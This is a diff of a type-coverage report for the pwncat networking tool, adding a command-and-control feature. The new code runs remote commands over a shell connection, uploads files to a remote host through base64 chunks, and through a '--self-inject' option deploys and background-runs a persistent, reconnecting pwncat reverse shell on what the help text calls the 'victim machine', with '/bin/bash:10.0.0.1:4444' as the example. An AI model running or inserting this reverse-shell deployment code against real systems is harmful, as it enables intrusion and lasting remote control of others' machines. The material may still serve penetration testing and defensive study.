+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        if erase:</span>
+<span class="line-precise" title="No Anys on this line!">            print("\r" * 1024 + "{}{}".format(prefix, message), end=end)</span>
+<span class="line-precise" title="No Anys on this line!">            sys.stdout.flush()</span>
+<span class="line-empty" title="No Anys on this line!">        else:</span>
+<span class="line-precise" title="No Anys on this line!">            print("{}{}".format(prefix, message), end=end)</span>
+<span class="line-precise" title="No Anys on this line!">            sys.stdout.flush()</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def remote_command(self, command):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str) -&gt; None</span>
+<span class="line-empty" title="No Anys on this line!">        """Run remote command with correct linefeeds.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Args:</span>
+<span class="line-empty" title="No Anys on this line!">            command (str): The command to execute on the remote end.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-empty" title="No Anys on this line!">        # TODO: determine remote host line feeds and set accordingly.</span>
+<span class="line-precise" title="No Anys on this line!">        self.__fsend(command + "\n")</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def create_remote_tmpfile(self):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: () -&gt; Optional[str]</span>
+<span class="line-empty" title="No Anys on this line!">        """OS-independent remote tempfile creation.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Returns:</span>
+<span class="line-empty" title="No Anys on this line!">            str or None: Returns path on success or None on error.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-precise" title="No Anys on this line!">        command = []</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("{} -c '".format(self.__python))</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("import tempfile;")</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("h,f=tempfile.mkstemp();")</span>
+<span class="line-precise" title="No Anys on this line!">        if self.__py3:</span>
+<span class="line-precise" title="No Anys on this line!">            command.append("print(f);")</span>
+<span class="line-empty" title="No Anys on this line!">        else:</span>
+<span class="line-precise" title="No Anys on this line!">            command.append("print f;")</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("'")</span>
+<span class="line-precise" title="No Anys on this line!">        self.remote_command("".join(command))</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        self.print_info("Creating tmpfile:", False, True)</span>
+<span class="line-precise" title="No Anys on this line!">        for response in self.__frecv():</span>
+<span class="line-precise" title="No Anys on this line!">            if response:</span>
+<span class="line-precise" title="No Anys on this line!">                tmpfile = response.rstrip()</span>
+<span class="line-precise" title="No Anys on this line!">                self.print_info("Creating tmpfile: {}".format(tmpfile), True, True)</span>
+<span class="line-precise" title="No Anys on this line!">                return tmpfile</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        self.print_info("Failed to create tmpfile", True, True)</span>
+<span class="line-precise" title="No Anys on this line!">        return None</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def upload(self, lpath, rpath):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str, str) -&gt; bool</span>
+<span class="line-empty" title="No Anys on this line!">        """OS-independent upload of a local file to a remote path.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Args:</span>
+<span class="line-empty" title="No Anys on this line!">            lpath (str): Local path of the file.</span>
+<span class="line-empty" title="No Anys on this line!">            rpath (str): Remote path, where to upload the base64 encoded file.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Returns:</span>
+<span class="line-empty" title="No Anys on this line!">            bool: Returns `True` on success and `False` on failure.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-precise" title="No Anys on this line!">        assert self.__python is not None</span>
+<span class="line-precise" title="No Anys on this line!">        assert self.__py3 is not None</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        rpath_b64 = self.create_remote_tmpfile()</span>
+<span class="line-precise" title="No Anys on this line!">        if rpath_b64 is None:</span>
+<span class="line-precise" title="No Anys on this line!">            return False</span>
+<span class="line-precise" title="No Anys on this line!">        if not self.__upload_file_base_64_encoded(lpath, rpath_b64):</span>
+<span class="line-precise" title="No Anys on this line!">            return False</span>
+<span class="line-precise" title="No Anys on this line!">        if not self.__remote_base64_decode(rpath_b64, rpath):</span>
+<span class="line-precise" title="No Anys on this line!">            return False</span>
+<span class="line-precise" title="No Anys on this line!">        return True</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!">    # Private Functions</span>
+<span class="line-empty" title="No Anys on this line!">    # --------------------------------------------------------------------------</span>
+<span class="line-precise" title="No Anys on this line!">    def __set_remote_python_path(self):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: () -&gt; bool</span>
+<span class="line-empty" title="No Anys on this line!">        """Enumerate remote Python binary.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Returns:</span>
+<span class="line-empty" title="No Anys on this line!">            bool: Returns `True` on success and `False` on failure.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-empty" title="No Anys on this line!">        # TODO: Make windows compatible</span>
+<span class="line-precise" title="No Anys on this line!">        for path in self.__PYTHON_PATHS:</span>
+<span class="line-precise" title="No Anys on this line!">            for version in self.__PYTHON_VERSIONS:</span>
+<span class="line-precise" title="No Anys on this line!">                python = path + "/" + version</span>
+<span class="line-precise" title="No Anys on this line!">                self.print_info("Probing for: {}".format(python))</span>
+<span class="line-precise" title="No Anys on this line!">                self.remote_command("test -f {p} &amp;&amp; echo {p} || echo;".format(p=python))</span>
+<span class="line-precise" title="No Anys on this line!">                for response in self.__frecv():</span>
+<span class="line-precise" title="No Anys on this line!">                    reg = re.search(r"^([.0-9]+)", response)</span>
+<span class="line-precise" title="No Anys on this line!">                    if response.rstrip() == python.rstrip():</span>
+<span class="line-precise" title="No Anys on this line!">                        self.print_info("Potential path: {}".format(python))</span>
+<span class="line-precise" title="No Anys on this line!">                        command = []</span>
+<span class="line-precise" title="No Anys on this line!">                        command.append("{} -c '".format(python))</span>
+<span class="line-precise" title="No Anys on this line!">                        command.append("from __future__ import print_function;")</span>
+<span class="line-precise" title="No Anys on this line!">                        command.append("import sys;")</span>
+<span class="line-precise" title="No Anys on this line!">                        command.append("v=sys.version_info;")</span>
+<span class="line-precise" title="No Anys on this line!">                        command.append('print("{}.{}.{}".format(v[0], v[1], v[2]));\'')</span>
+<span class="line-precise" title="No Anys on this line!">                        data = "".join(command)</span>
+<span class="line-precise" title="No Anys on this line!">                        self.remote_command(data)</span>
+<span class="line-precise" title="No Anys on this line!">                        continue</span>
+<span class="line-precise" title="No Anys on this line!">                    if reg:</span>
+<span class="line-precise" title="No Anys on this line!">                        match = reg.group(1)</span>
+<span class="line-precise" title="No Anys on this line!">                        if match[0] == "2":</span>
+<span class="line-precise" title="No Anys on this line!">                            self.__py3 = False</span>
+<span class="line-precise" title="No Anys on this line!">                        elif match[0] == "3":</span>
+<span class="line-precise" title="No Anys on this line!">                            self.__py3 = True</span>
+<span class="line-empty" title="No Anys on this line!">                        else:</span>
+<span class="line-precise" title="No Anys on this line!">                            self.print_info(</span>
+<span class="line-precise" title="No Anys on this line!">                                "Could not determine major version: {}".format(reg.group(1))</span>
+<span class="line-empty" title="No Anys on this line!">                            )</span>
+<span class="line-precise" title="No Anys on this line!">                            return False</span>
+<span class="line-precise" title="No Anys on this line!">                        self.print_info("Found valid Python{} version: {}".format(match[0], match))</span>
+<span class="line-precise" title="No Anys on this line!">                        self.__python = python</span>
+<span class="line-precise" title="No Anys on this line!">                        return True</span>
+<span class="line-empty" title="No Anys on this line!">                    # Nothing matched, break the innter loop</span>
+<span class="line-precise" title="No Anys on this line!">                    break</span>
+<span class="line-precise" title="No Anys on this line!">        return False</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def __upload_file_base_64_encoded(self, lpath, rpath):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str, str) -&gt; bool</span>
+<span class="line-empty" title="No Anys on this line!">        """Upload a local file to a base64 encoded remote file.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Args:</span>
+<span class="line-empty" title="No Anys on this line!">            lpath (str): Local path of the file.</span>
+<span class="line-empty" title="No Anys on this line!">            rpath (str): Remote path, where to upload the base64 encoded file.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Returns:</span>
+<span class="line-empty" title="No Anys on this line!">            bool: Returns `True` on success and `False` on failure.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-precise" title="No Anys on this line!">        first = True</span>
+<span class="line-imprecise" title="Any Types on this line: 
+Explicit (x2)">        with open(lpath, "r") as fhandle:</span>
+<span class="line-precise" title="No Anys on this line!">            lines = fhandle.readlines()</span>
+<span class="line-precise" title="No Anys on this line!">            count = len(lines)</span>
+<span class="line-precise" title="No Anys on this line!">            curr = 1</span>
+<span class="line-precise" title="No Anys on this line!">            for line in lines:</span>
+<span class="line-precise" title="No Anys on this line!">                self.print_info(</span>
+<span class="line-precise" title="No Anys on this line!">                    "Uploading: {} -&gt; {} ({}/{})".format(lpath, rpath, curr, count), False, True</span>
+<span class="line-empty" title="No Anys on this line!">                )</span>
+<span class="line-precise" title="No Anys on this line!">                b64 = self.__enc.base64_encode(line)</span>
+<span class="line-precise" title="No Anys on this line!">                if first:</span>
+<span class="line-precise" title="No Anys on this line!">                    self.remote_command('echo "{}" &gt; {}'.format(b64, rpath))</span>
+<span class="line-precise" title="No Anys on this line!">                    first = False</span>
+<span class="line-empty" title="No Anys on this line!">                else:</span>
+<span class="line-precise" title="No Anys on this line!">                    self.remote_command('echo "{}" &gt;&gt; {}'.format(b64, rpath))</span>
+<span class="line-precise" title="No Anys on this line!">                curr += 1</span>
+<span class="line-precise" title="No Anys on this line!">        self.print_info()</span>
+<span class="line-empty" title="No Anys on this line!">        # TODO: md5 check if this is legit</span>
+<span class="line-precise" title="No Anys on this line!">        return True</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def __remote_base64_decode(self, rpath_source, rpath_target):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str, str) -&gt; bool</span>
+<span class="line-empty" title="No Anys on this line!">        """Decode a remote base64 encoded file with pure Python.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Args:</span>
+<span class="line-empty" title="No Anys on this line!">            rpath_source (str): The remote path to the existing base64 encoded file.</span>
+<span class="line-empty" title="No Anys on this line!">            rpath_target (str): The remote path to the desired base64 decoded file.</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!">        Returns:</span>
+<span class="line-empty" title="No Anys on this line!">            bool: Returns `True` on success or `False` on failure.</span>
+<span class="line-empty" title="No Anys on this line!">        """</span>
+<span class="line-precise" title="No Anys on this line!">        command = []</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("{} -c 'import base64;".format(self.__python))</span>
+<span class="line-precise" title="No Anys on this line!">        command.append('f=open("{}", "r");'.format(rpath_source))</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("lines = f.readlines();")</span>
+<span class="line-precise" title="No Anys on this line!">        if self.__py3:</span>
+<span class="line-precise" title="No Anys on this line!">            command.append('print("".join([base64.b64decode(l.encode()) for l in lines]));\'')</span>
+<span class="line-empty" title="No Anys on this line!">        else:</span>
+<span class="line-precise" title="No Anys on this line!">            command.append('print "".join([base64.b64decode(l) for l in lines]);\'')</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("&gt; {}".format(rpath_target))</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        self.print_info("Decoding: {} -&gt; {}".format(rpath_source, rpath_target))</span>
+<span class="line-precise" title="No Anys on this line!">        self.remote_command("".join(command))</span>
+<span class="line-empty" title="No Anys on this line!">        # TODO: validate via md5</span>
+<span class="line-precise" title="No Anys on this line!">        return True</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!"># [8/10 Command &amp; Control]: (1/2) CNCAutoDeploy</span>
+<span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
+<span class="line-precise" title="No Anys on this line!">class CNCAutoDeploy(CNC):</span>
+<span class="line-empty" title="No Anys on this line!">    """Command&amp;Control pwncat auto deployment class."""</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def __init__(</span>
+<span class="line-empty" title="No Anys on this line!">        self,</span>
+<span class="line-empty" title="No Anys on this line!">        enc,  # type: StringEncoder</span>
+<span class="line-empty" title="No Anys on this line!">        send,  # type: Callable[[str], None]</span>
+<span class="line-empty" title="No Anys on this line!">        recv,  # type: Callable[[], Iterator[str]]</span>
+<span class="line-empty" title="No Anys on this line!">        cmd,  # type: str</span>
+<span class="line-empty" title="No Anys on this line!">        host,  # type: str</span>
+<span class="line-empty" title="No Anys on this line!">        port,  # type: str</span>
+<span class="line-empty" title="No Anys on this line!">    ):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (...) -&gt; None</span>
+<span class="line-empty" title="No Anys on this line!">        try:</span>
+<span class="line-precise" title="No Anys on this line!">            super(CNCAutoDeploy, self).__init__(enc, send, recv)</span>
+<span class="line-precise" title="No Anys on this line!">        except FileNotFoundError:</span>
+<span class="line-empty" title="No Anys on this line!">            return</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">        local_path = os.path.abspath(__file__)</span>
+<span class="line-precise" title="No Anys on this line!">        remote_path = self.create_remote_tmpfile()</span>
+<span class="line-precise" title="No Anys on this line!">        if remote_path is None:</span>
+<span class="line-empty" title="No Anys on this line!">            return</span>
+<span class="line-precise" title="No Anys on this line!">        if not self.upload(local_path, remote_path):</span>
+<span class="line-empty" title="No Anys on this line!">            return</span>
+<span class="line-empty" title="No Anys on this line!">        # TODO: Ensure pwncat stays running</span>
+<span class="line-precise" title="No Anys on this line!">        self.__start_pwncat(remote_path, cmd, host, port)</span>
+<span class="line-empty" title="No Anys on this line!">        return</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">    def __start_pwncat(self, remote_path, binary, host, port):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str, str, str, str) -&gt; None</span>
+<span class="line-precise" title="No Anys on this line!">        command = []</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("nohup")</span>
+<span class="line-precise" title="No Anys on this line!">        command.append(self.python)</span>
+<span class="line-precise" title="No Anys on this line!">        command.append(remote_path)</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("--exec {}".format(binary))</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("--reconn -1")</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("--reconn-wait 1")</span>
+<span class="line-precise" title="No Anys on this line!">        command.append(host)</span>
+<span class="line-precise" title="No Anys on this line!">        command.append(port)</span>
+<span class="line-precise" title="No Anys on this line!">        command.append("&amp;")</span>
+<span class="line-precise" title="No Anys on this line!">        data = " ".join(command)</span>
+<span class="line-precise" title="No Anys on this line!">        print("Starting pwncat rev shell: {}".format(data))</span>
+<span class="line-precise" title="No Anys on this line!">        self.remote_command(data)</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
+<span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
+<span class="line-empty" title="No Anys on this line!"># ###</span>
+<span class="line-empty" title="No Anys on this line!"># ###   9 / 10   C O M M A N D   L I N E   A R G U M E N T S</span>
+<span class="line-empty" title="No Anys on this line!"># ###</span>
+<span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
+<span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
+<span class="line-empty" title="No Anys on this line!"># [9/10 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">def get_version():</span>
 <span class="line-empty" title="No Anys on this line!">    # type: () -&gt; str</span>
@@ -5431,6 +6133,15 @@ Error (x2)">                    self.log.trace("Joining %s", self.__threads[key]
 <span class="line-empty" title="No Anys on this line!">    # type: (str) -&gt; str</span>
 <span class="line-precise" title="No Anys on this line!">    if value not in ["auto", "always", "never"]:</span>
 <span class="line-precise" title="No Anys on this line!">        raise argparse.ArgumentTypeError("%s is an invalid color definition" % value)</span>
+<span class="line-precise" title="No Anys on this line!">    return value</span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-precise" title="No Anys on this line!">def _args_check_upload_myself(value):</span>
+<span class="line-empty" title="No Anys on this line!">    # type: (str) -&gt; str</span>
+<span class="line-precise" title="No Anys on this line!">    opts = value.split(":")</span>
+<span class="line-precise" title="No Anys on this line!">    if len(opts) != 3:</span>
+<span class="line-precise" title="No Anys on this line!">        raise argparse.ArgumentTypeError("%s is an invalid cmd[:host]:port definition" % value)</span>
+<span class="line-precise" title="No Anys on this line!">    _args_check_port(opts[-1])</span>
 <span class="line-precise" title="No Anys on this line!">    return value</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
@@ -5637,7 +6348,7 @@ Explicit (x2)">    if args.ping_init is not False and not args.udp:</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># [8/9 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser</span>
+<span class="line-empty" title="No Anys on this line!"># [9/10 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser</span>
 <span class="line-empty" title="No Anys on this line!"># -------------------------------------------------------------------------------------------------</span>
 <span class="line-precise" title="No Anys on this line!">def get_args():</span>
 <span class="line-empty" title="No Anys on this line!">    # type: () -&gt; argparse.Namespace</span>
@@ -5671,6 +6382,8 @@ Explicit (x2)">    positional = parser.add_argument_group("positional arguments"
 Explicit (x2)">    mode = parser.add_argument_group("mode arguments")</span>
 <span class="line-any" title="Any Types on this line: 
 Explicit (x2)">    optional = parser.add_argument_group("optional arguments")</span>
+<span class="line-any" title="Any Types on this line: 
+Explicit (x2)">    cnc = parser.add_argument_group("command &amp; control arguments")</span>
 <span class="line-any" title="Any Types on this line: 
 Explicit (x2)">    advanced = parser.add_argument_group("advanced arguments")</span>
 <span class="line-any" title="Any Types on this line: 
@@ -5812,6 +6525,25 @@ Explicit (x3)">    optional.add_argument(</span>
 <span class="line-empty" title="No Anys on this line!">""",</span>
 <span class="line-empty" title="No Anys on this line!">    )</span>
 <span class="line-empty" title="No Anys on this line!"></span>
+<span class="line-any" title="Any Types on this line: 
+Explicit (x3)">    cnc.add_argument(</span>
+<span class="line-precise" title="No Anys on this line!">        "--self-inject",</span>
+<span class="line-precise" title="No Anys on this line!">        metavar="cmd:host:port",</span>
+<span class="line-precise" title="No Anys on this line!">        type=_args_check_upload_myself,</span>
+<span class="line-precise" title="No Anys on this line!">        default=None,</span>
+<span class="line-precise" title="No Anys on this line!">        help="""Listen mode (TCP only):</span>
+<span class="line-empty" title="No Anys on this line!">If you are about to inject a reverse shell onto the</span>
+<span class="line-empty" title="No Anys on this line!">victim machine (via php, bash, nc, ncat or similar),</span>
+<span class="line-empty" title="No Anys on this line!">start your listening server with this argument.</span>
+<span class="line-empty" title="No Anys on this line!">This will then (as soon as the reverse shell connects)</span>
+<span class="line-empty" title="No Anys on this line!">automatically deploy and background-run an unbreakable</span>
+<span class="line-empty" title="No Anys on this line!">pwncat reverse shell onto the victim machine which then</span>
+<span class="line-empty" title="No Anys on this line!">also connects back to you with specified arguments.</span>
+<span class="line-empty" title="No Anys on this line!">Example: '--self-inject /bin/bash:10.0.0.1:4444'</span>
+<span class="line-empty" title="No Anys on this line!">Note: this is currently an experimental feature and does</span>
+<span class="line-empty" title="No Anys on this line!">not work on Windows remote hosts yet.</span>
+<span class="line-empty" title="No Anys on this line!">""",</span>
+<span class="line-empty" title="No Anys on this line!">    )</span>
 <span class="line-any" title="Any Types on this line: 
 Explicit (x3)">    advanced.add_argument(</span>
 <span class="line-precise" title="No Anys on this line!">        "--script-send",</span>
@@ -6122,7 +6854,7 @@ Explicit (x11)">    if args.http or args.https or args.rebind or args.wait or ar
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
-<span class="line-empty" title="No Anys on this line!"># ###   9 / 9   M A I N   E N T R Y P O I N T</span>
+<span class="line-empty" title="No Anys on this line!"># ###   10 / 10   M A I N   E N T R Y P O I N T</span>
 <span class="line-empty" title="No Anys on this line!"># ###</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
 <span class="line-empty" title="No Anys on this line!"># #################################################################################################</span>
@@ -6301,6 +7033,14 @@ Explicit (x2)">        net_cli_r = IONetwork(ssig, enc, host, ports, "client", s
 Explicit (x1)">    if args.listen:</span>
 <span class="line-any" title="Any Types on this line: 
 Explicit (x2)">        net = IONetwork(ssig, enc, host, ports, "server", srv_opts, cli_opts, sock_opts)</span>
+<span class="line-empty" title="No Anys on this line!">        # Run blocking auto-deploy.</span>
+<span class="line-empty" title="No Anys on this line!">        # This will hand over to normal listening server on success or failure</span>
+<span class="line-any" title="Any Types on this line: 
+Explicit (x1)">        if args.self_inject:</span>
+<span class="line-any" title="Any Types on this line: 
+Explicit (x6)">            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(":")</span>
+<span class="line-any" title="Any Types on this line: 
+Explicit (x3)">            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)</span>
 <span class="line-precise" title="No Anys on this line!">        run = Runner(PSEStore(ssig, [net]))</span>
 <span class="line-precise" title="No Anys on this line!">        run.add_action(</span>
 <span class="line-precise" title="No Anys on this line!">            "RECV",</span>
